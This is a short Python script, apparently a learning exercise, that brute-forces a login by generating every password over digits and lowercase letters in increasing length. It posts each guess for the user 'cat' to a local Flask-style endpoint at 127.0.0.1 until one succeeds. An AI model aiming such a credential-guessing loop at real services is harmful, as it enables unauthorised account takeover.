import requests
alphabet = '0123456789qwertyuiopasdfghjklzxcvbnm'
# create the var with symbols
length = 0
# length password
state = 0
# num of current symbol
base = len(alphabet)
while True:
    password = ''
    temp_state = state
    # create the var for psw
    while temp_state > 0:
        ceil = temp_state // base
        rest = temp_state % base
        password = alphabet[rest] + password
        temp_state = ceil
    # brute force
    password = alphabet[0] * (length - len(password)) + password
    print(state, password)
    response = requests.post('http://127.0.0.1:5000/auth', json={'login': 'cat', 'password': password})
    # post requests with json file
    if response.status_code == 200:
        print("Success!", 'cat', password)
        break
    state +=1
    if password == alphabet[-1] * length:
        length += 1
        state = 0
